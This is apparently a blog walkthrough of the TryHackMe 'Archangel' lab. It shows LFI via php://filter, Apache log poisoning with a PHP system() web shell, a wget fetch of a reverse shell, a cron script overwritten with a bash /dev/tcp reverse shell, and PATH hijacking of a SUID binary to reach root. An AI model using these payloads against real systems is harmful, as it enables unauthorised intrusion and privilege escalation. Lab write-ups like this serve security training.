---
layout: post
title: "Archangel"
date: 2022-10-20
categories: [Tryhackme, Easy-THM]
tags: [rustscan, dirsearch, Rick-Rolled, LFI, log-poisoning, RCE, /etc/crontab, SUID, relative-path]
image: ../../assets/img/posts/archangel.png 

---

## Description

Boot2root, Web exploitation, Privilege escalation, LFI

|**Room**|[Archangel](https://tryhackme.com/room/archangel)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[Archangel](https://tryhackme.com/p/Archangel)|

---

Deploy the machine and quickly scan the ports using rustcan,

```bash
rustscan -a 10.10.242.136
```

![image](https://user-images.githubusercontent.com/67465230/187167546-a3696a6a-6b42-426c-a6fb-299db689c391.png)

There are 2 open ports. Let's scan them using using nmap,

```bash
nmap -sC -sV -p22,80 10.10.242.136 -oN nmap.txt
```

![image](https://user-images.githubusercontent.com/67465230/187167602-ee03aca4-6f42-4c5a-b34f-6f13a82e66e9.png)

Looks like port 22 is running ssh service and port 80 is running apache webserver. Let's enumerate port 80.

Visit http://10.10.242.136,

![image](https://user-images.githubusercontent.com/67465230/187167641-3038c45d-538f-4adf-b1e0-adf41611dc14.png)

we got a Website named Mafialive Solutions. I enumerated it fully and also tried to search for potential exploits but found none.

Now, we can find hidden directories,

```bash
dirsearch -u http://10.10.242.136/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -i 200,301 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187167684-7be2068d-04c4-4a94-870a-7a47f6e84138.png)

we got some hidden directories.

Let's start by visit http://10.10.242.136/flags,

![image](https://user-images.githubusercontent.com/67465230/187167724-c3d51752-64a5-406f-9aa9-cc26af052108.png)

we got a page name flag.html. Seems like there is something in it.

As soon as I clicked on the page, it redirects me to the Rick Astley video,

![image](https://user-images.githubusercontent.com/67465230/187167784-e4453daf-9c2d-4355-b4e4-b05dfe815a3c.png)

*RickRolled*

I decided to open its source code,

![image](https://user-images.githubusercontent.com/67465230/187167865-4159161c-41c6-49d1-8d94-ce00fa7bf872.png)

and there I found the redirection link. We can't do further than this. A dead end.

Now, that we don't have any way to move in, we can try to add a this machine ip in /etc/hosts so that it can be resolved with its domain name,

```bash
sudo echo "10.10.52.235    mafialive.thm" >> /etc/hosts
```

![image](https://user-images.githubusercontent.com/67465230/187167913-1be9d3fa-e752-4237-b474-4a1f138769c4.png)

Now, that we have added the domain name of the machine, let's navigate to http://mafialive.thm and we will see our flag,

![image](https://user-images.githubusercontent.com/67465230/187167971-24c62d8f-b099-4dbc-98e3-0e455d7a7b32.png)

Now, we can try to find any hidden directories on domain name,

```bash
dirsearch -u http://mafialive.thm/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -i 200,301 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187168022-b063a8cc-119c-41f7-b725-95994c559bdb.png)

there is a **robots.txt** file exposed on the machine.

Let's take a look at robots.txt file,

![image](https://user-images.githubusercontent.com/67465230/187168086-f7c5e710-18af-4f30-96f2-13715c6e4087.png)

Seems like this file don't want google crawlers to not crawl through this path.

We can navigate to this path and see what is there, http://mafialive.thm/test.php

![image](https://user-images.githubusercontent.com/67465230/187168181-2902633e-fea1-467d-a5a7-be325bb675a2.png)

We got a ordinary webpage with a button.

![image](https://user-images.githubusercontent.com/67465230/187168248-507db33a-74f3-40b0-af6d-e3a62fd7d1da.png)

Clicking on this button will show us a message, we can find that it redirects to **mrrobot.php** in the directory **/var/www/html/development_testing**.

![image](https://user-images.githubusercontent.com/67465230/187168342-586c93b0-4deb-4b6c-98f1-c20a5703a3fb.png)

Going back one directory, we are now informed that we are not allowed of doing directory travel.

This url hints the possibility of Local File Inclusion vulnerability. After trying to access sensitive files like /etc/passwd and access.log files by passing the value to view parameter, we could find that the php filter present restricts us from accessing those files. Actual contents of the file can be viewed by parsing the content into base64, as PHP has a inbuilt function [Using php://filter for local file inclusion](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/) to convert normal text to base64. Using the below payload we could read the contents of test.php in base64.

```php
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

![image](https://user-images.githubusercontent.com/67465230/187168409-1ad3269a-7051-40c8-ba8b-332300afc796.png)

We got the base64 encoded php file. We can decode it in our kali machine,

```bash
echo "encoded-string" | base64 -d
```

This gives us contents of test.php and second flag,

![image](https://user-images.githubusercontent.com/67465230/187168487-1f83f4bc-e1da-4d08-a3f0-748070a9a141.png)

Checking the php file, we could find that the code is checking two conditions,

- **Condition1** : 
	`if(!containsStr($_GET['view'], '../..')`
	*Condition restricts path traversal*

- **Condition2** :
	`containsStr($_GET['view'], '/var/www/html/development_testing'))`
*Condition 2 depicts everything we is restricted to a single location, i.e. `/var/www/html/development_testing`*

We can bypass the path traversal protection using ".././../" to travel back directories. We can read *access.log* file in */var/log/apache2* shows that *User-Agent* being logged in. 

![image](https://user-images.githubusercontent.com/67465230/187168530-caa5adf3-63b8-402b-aa97-6882faaeda89.png)

We can try to gain a RCE using log poisoning attack and gain a shell.

Start the burp and let it intercept the request and pass the malicious php code snippet in the User-Agent header,

```php
<?php system($_GET['cmd']); ?>
```

![image](https://user-images.githubusercontent.com/67465230/187168595-c4941a19-0482-4c45-b639-a1dc718a4fb5.png)

After forwarding the request and exiting of burpsuite and refreshing the page, let's verify using this command,

```bash
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//var/log/apache2/access.log&cmd=id
```

![image](https://user-images.githubusercontent.com/67465230/187168670-30834ab5-ccf2-4a4f-8f2a-3bcaca4d997d.png)

We can see our malicious code is working.

Now, we can gain foothold by using a php-reverse-shell and change the desired IP and port and put them in a file named shell.php.

Start the server using `python3 -m http.server` and setup a listener so that it can catch the connection when the shell triggers `nc -nvlp 4444`.

Now, let's upload our file on the webserver,

```bash
view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=wget http://10.9.0.226:8000/php-reverse-shell.php -O shell.php
```

![image](https://user-images.githubusercontent.com/67465230/187168718-95d5e87a-3dbc-4bae-bc2a-ed08f44a4987.png)

It got successfully uploaded.

Now, we should trigger the shell by visiting http://mafialive.thm/shell.php,

And we get caught a shell,

![image](https://user-images.githubusercontent.com/67465230/187168783-9a5905f0-0a84-4323-a1c6-5b3e751abdff.png)

Now, we need to make our shell fully functional,

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116
```

Navigating to /home directory and I found that there is only one user. Navigating inside the user directory and enumerating directory, we got our user.txt file,

![image](https://user-images.githubusercontent.com/67465230/187168979-44bc5576-f31a-447d-b038-02827750d293.png)

Now, since we are www-data user and we don't have privileges to run higher privileges commands, so we are going to elevate our privilege to Archangel user.

Looking carefully at the cronjobs, 

```bash
cat /etc/crontab
```

![image](https://user-images.githubusercontent.com/67465230/187169019-3887fb67-b9da-4c2e-bbce-69f1853bdc7b.png)

we can see the file which runs periodically runs as Archangel user.

Navigating to opt directory and we find our helloworld.sh script,

![image](https://user-images.githubusercontent.com/67465230/187169054-e875845b-32a2-4776-98fc-6b4f4bead6ee.png)

I tried to navigate into backupfiles directory but failed,

![image](https://user-images.githubusercontent.com/67465230/187169090-0b5400b6-1e27-4037-9252-68c808d6c72c.png)

Let's now take a look at helloworld.sh file,

![image](https://user-images.githubusercontent.com/67465230/187169120-edbf338c-d8de-444f-b90d-cf647839c896.png)

this script is simply putting "hello world" string in **/opt/backupfiles/helloworld.txt**.

Let's start the listener using `nc -nvlp 5555` and put one-liner bash shell in the helloworld.sh script,

```bash
echo "#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/10.9.0.226/5555 <&1'" > helloworld.sh
```

After sometime, cronjobs will run this script and we will get our shell as archangel user,

![image](https://user-images.githubusercontent.com/67465230/187169180-14d01bcf-2d43-4e2b-9b31-4d7cc8c117ac.png)

Now, we need to find those files which has SUID bit set on them,

```bash
find / -perm -04000 -type f 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187169224-3729a827-95c2-47f1-aa04-282f4a8cad85.png)

**/home/archangel/secret/backup** file has SUID bit set on it, so let's see how we can abuse it.

Navigating to the /home/secret directory and viewing the permission that this file will runs as root when executed,

![image](https://user-images.githubusercontent.com/67465230/187169272-eac3b5df-38d8-42b4-8d0b-0de7bc3eb127.png)

Now, let's execute this file and see what happens,

```bash
/home/archangel/secret/backup
```

![image](https://user-images.githubusercontent.com/67465230/187169319-b05e0427-bb52-4cbf-9d9d-92a7568b67df.png)

There is an error of *copy* command, I wonder what copy command is doing here.

Let's try to read the content of this file,

![image](https://user-images.githubusercontent.com/67465230/187169364-4a860a38-a7a9-47bb-accd-4860b77ffd1f.png)

it is a binary file and we can't read it.

But, we read the readable strings using command below,

```bash
strings backup
```

![image](https://user-images.githubusercontent.com/67465230/187169415-c15ad3fe-85a8-4e9f-b30e-59ca09185a18.png)

we can see that `cp` command is used as relative path and not as absolute path.

>Now, relative paths are dangerous as we can replace the contents of the file with our malicious code and the whole file in return will run as root user, so it is our win here. This is known as Path variable Exploitation.

Our next hint to find the root flag states “Certain paths are dangerous” … we now know why ;). Let’s create a file called cp so we can trick this ‘backup’ program to use it instead by altering our path file… here’s how we do it:

First, we will create a **cp** file and make it an executable. Then we want to ensure it contains the following code:

```bash
#!/bin/bash
bash -p
```

Now, when we run this file, we will become root,

![image](https://user-images.githubusercontent.com/67465230/187169465-6d069532-7c38-4804-be76-41c0922177b5.png)